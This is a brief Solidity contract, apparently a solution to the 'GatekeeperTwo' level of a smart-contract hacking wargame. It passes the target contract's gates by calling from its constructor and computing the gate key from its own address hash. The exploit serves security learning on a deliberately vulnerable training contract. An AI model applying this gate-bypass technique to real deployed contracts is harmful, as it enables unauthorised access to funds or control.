// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../instances/Ilevel14.sol";

contract LetMeInTwo {

    constructor () public {
        GatekeeperTwo level12 = GatekeeperTwo(0xC9Bb53014e8c8414ce406f1e3F3C8d392163d91F);
        bytes8 myKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
        level12.enter(myKey);        
    }
}

